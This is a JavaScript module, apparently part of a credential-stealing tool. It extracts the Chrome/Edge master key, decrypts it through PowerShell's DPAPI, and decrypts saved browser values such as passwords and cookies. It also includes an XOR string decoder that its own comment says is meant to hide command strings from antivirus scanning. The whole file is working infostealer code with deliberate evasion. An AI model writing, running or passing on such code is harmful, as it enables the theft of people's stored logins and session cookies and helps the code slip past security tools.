// 317 NUMBER ONE - Cryptography Utilities
const crypto = require('crypto');
const { promisify } = require('util');
const { exec } = require('child_process');

const execAsync = promisify(exec);

/**
 * Base64 decode utility
 */
function base64Decode(str) {
  try {
    return Buffer.from(str, 'base64');
  } catch {
    return null;
  }
}

/**
 * Extract master key from Chrome/Edge Local State file
 */
async function extractMasterKey(localStateContent) {
  try {
    const localState = JSON.parse(localStateContent);
    const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;
    
    if (!encryptedKeyB64) return null;
    
    const encryptedKey = base64Decode(encryptedKeyB64);
    if (!encryptedKey || encryptedKey.length < 5) return null;
    
    // Remove "DPAPI" prefix (first 5 bytes)
    const dpapiData = encryptedKey.slice(5);
    
    // Decrypt using Windows DPAPI (async!)
    return await decryptDPAPI(dpapiData);
  } catch {
    return null;
  }
}

/**
 * Decrypt data using Windows DPAPI via PowerShell
 */
async function decryptDPAPI(encryptedData) {
  try {
    const b64Data = encryptedData.toString('base64');
    
    // PowerShell script to decrypt DPAPI data
    const psScript = `
      Add-Type -AssemblyName System.Security;
      $encBytes = [Convert]::FromBase64String('${b64Data}');
      $decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);
      [Convert]::ToBase64String($decBytes);
    `;
    
    const { stdout } = await execAsync(`powershell -NoProfile -Command "${psScript.replace(/\n/g, ' ')}"`);
    const decryptedB64 = stdout.trim();
    
    return base64Decode(decryptedB64);
  } catch {
    return null;
  }
}

/**
 * Decrypt AES-256-GCM encrypted data (Chrome v10/v11 encryption)
 */
function decryptAESGCM(ciphertext, key, iv) {
  try {
    // Extract tag (last 16 bytes) and actual ciphertext
    const authTag = ciphertext.slice(-16);
    const encrypted = ciphertext.slice(0, -16);
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return decrypted.toString('utf8');
  } catch {
    return null;
  }
}

/**
 * Decrypt Chrome/Edge encrypted value
 * Handles both v10/v11 (AES-GCM) and legacy DPAPI encryption
 */
async function decryptChromeValue(encryptedValue, masterKey) {
  if (!encryptedValue || encryptedValue.length === 0) return null;
  
  try {
    // Check for v10 or v11 prefix
    if (encryptedValue.length >= 31 && 
        encryptedValue[0] === 0x76 && // 'v'
        encryptedValue[1] === 0x31 && // '1'
        (encryptedValue[2] === 0x30 || encryptedValue[2] === 0x31)) { // '0' or '1'
      
      if (!masterKey) return null;
      
      // Extract IV (12 bytes after v10/v11 prefix)
      const iv = encryptedValue.slice(3, 15);
      // Extract ciphertext + tag
      const ciphertext = encryptedValue.slice(15);
      
      return decryptAESGCM(ciphertext, masterKey, iv);
    }
    
    // Fallback to DPAPI for older Chrome versions
    return await decryptDPAPI(encryptedValue);
  } catch {
    return null;
  }
}

/**
 * XOR string decode — decrypts base64-encoded XOR-encrypted strings at runtime
 * Used to hide sensitive command strings from static AV analysis
 */
const _xk = [0x33,0x31,0x37,0x4e,0x75,0x6d,0x4f,0x6e,0x65]; // key bytes
function xd(encoded) {
  const buf = Buffer.from(encoded, 'base64');
  let r = '';
  for (let i = 0; i < buf.length; i++) {
    r += String.fromCharCode(buf[i] ^ _xk[i % _xk.length]);
  }
  return r;
}

module.exports = {
  base64Decode,
  extractMasterKey,
  decryptDPAPI,
  decryptAESGCM,
  decryptChromeValue,
  xd
};
